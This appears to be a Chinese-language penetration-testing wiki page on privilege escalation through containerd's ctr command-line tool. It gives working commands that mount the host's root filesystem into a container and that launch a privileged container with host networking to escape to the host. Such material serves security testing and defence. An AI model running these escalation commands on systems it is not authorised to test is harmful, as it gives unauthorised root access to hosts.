# Containerd (ctr) 权限提升

{{#include ../../banners/hacktricks-training.md}}

## 基本信息

前往以下链接，了解 **`containerd` 和 `ctr` 在容器堆栈中的位置**：

{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

如果你发现主机包含 `ctr` 命令，即 containerd 附带的原生 CLI：<sup>[[1]](#references)</sup>
```bash
which ctr
/usr/bin/ctr
```
你可以列出 containerd 已知的 images：<sup>[[2]](#references)</sup>
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
然后，**运行其中一个镜像，并将主机根目录递归绑定挂载到容器根目录**：<sup>[[3]](#references)[[4]](#references)</sup>
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

运行一个 privileged mode 下的 container，并测试是否可以 escape。\
你可以使用 host networking 运行一个 privileged container，如下所示：<sup>[[5]](#references)[[6]](#references)</sup>
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
`--privileged` 会授予进程调用者的有效 Linux capabilities，并移除多个隔离控制，但 escape 是否可行仍取决于环境；请使用以下页面中提到的 techniques 进行测试：<sup>[[5]](#references)</sup>

{{#ref}}
container-security/
{{#endref}}

## References

- [1] [containerd 入门](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [2] [`ctr image` command 实现](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/images/images.go)
- [3] [`ctr run` command 实现](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/run/run.go)
- [4] [Linux kernel shared-subtree 文档](https://docs.kernel.org/filesystems/sharedsubtree.html)
- [5] [containerd OCI package: `WithPrivileged`](https://pkg.go.dev/github.com/containerd/containerd%40v1.7.33/oci)
- [6] [containerd `ctr` command flags](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/commands.go)
{{#include ../../banners/hacktricks-training.md}}
